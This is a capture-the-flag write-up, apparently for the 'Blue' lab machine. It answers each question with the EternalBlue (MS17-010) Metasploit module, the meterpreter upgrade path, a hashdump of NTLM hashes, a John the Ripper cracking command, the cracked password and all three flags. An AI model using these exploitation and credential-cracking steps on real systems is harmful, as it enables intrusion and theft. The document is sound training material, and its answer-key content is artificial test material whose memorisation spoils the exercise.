# Blue #

# Recon #

>> How many ports are open with a port number under 1000?
=> 3
  
>> What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
=> ms17-010
  
# Gain Access #

>> Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
=> exploit/windows/smb/ms17_010_eternalblue
  
>> Show options and set the one required value. What is the name of this value? (All caps for submission)
=> RHOSTS
  
# Escalate #

>> how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
=> post/multi/manage/shell_to_meterpreter
  
>> Select this (use MODULE_PATH). Show options, what option are we required to change?
=> SESSION
  

# Cracking #

>> Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
=> jon

Hashes of users   
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```
using john to crack the hashes 
```
sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt passdump
```
  
>> Copy this password hash to a file and research how to crack it. What is the cracked password?
=> alqfna22


# Find Flags #


>> Flag 1 
=> flag{access_the_machine}
  
>> Flag 2
=> flag{sam_database_elevated_access}
  
>> Flag 3
=> flag{admin_documents_can_be_valuable}
